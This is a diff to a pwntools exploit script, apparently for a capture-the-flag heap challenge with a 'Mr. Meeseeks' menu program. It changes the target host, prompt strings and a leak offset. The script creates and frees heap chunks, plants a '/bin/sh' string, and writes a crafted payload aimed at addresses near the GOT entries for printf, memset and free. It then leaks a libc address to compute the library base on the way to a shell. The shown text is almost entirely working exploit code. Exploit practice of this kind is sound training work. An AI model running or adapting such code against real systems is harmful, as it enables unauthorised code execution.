@@ -19,7 +19,7 @@ def log_addr(name, address):
     log.info(s)
 
 
-HOST = '192.168.125.11'
+HOST = '0.0.0.0'
 LHOST = 'localhost'
 PORT = 1337
 
@@ -67,7 +67,7 @@ def view(index):
     io.recvuntil(readUntilMenuOption)
     io.sendline(b"3")
     io.sendlineafter(b"Index: ", f'{index}'.encode('ascii'))
-    io.recvuntil(b'Grand Master: ')
+    io.recvuntil(b'Mr. Meeseeks: ')
     return io.recvline().strip()
 
 
@@ -81,11 +81,11 @@ def edit(index, name):
 io = start()
 io.timeout = 0.5
 
-a = create(b"a")
-b = create(b"b")
-c = create(b"c")
-d = create(b"d")
-e = create(b"e")
+a = create(b"Meeseeks a")
+b = create(b"Meeseeks b")
+c = create(b"Meeseeks c")
+d = create(b"Meeseeks d")
+e = create(b"Meeseeks e")
 f = create(b'/bin/sh\x00')
 
 free(e)
@@ -93,7 +93,6 @@ free(e)
 printfAddr = 0x404030
 printfAddr = printfAddr - 0x20
 
-puts = printfAddr - 0x20
 memset = printfAddr + 0x8
 my_free = printfAddr + 0x28
 
@@ -102,7 +101,7 @@ payload = p64(0x1) + p64(memset) + p64(0) + p64(0x72)
 g = create(b"a"*64 + payload)
 l = create(p64(0xdeadbeefc0dec0fe))
 resp = view(l)
-leak = resp[8:] + b"\x00\x00"
+leak = resp[55:] + b"\x00\x00"
 u = make_unpacker(64, endian='little', sign='unsigned')
 READ = u(leak)
 libc.address = READ - libc.symbols["read"] 
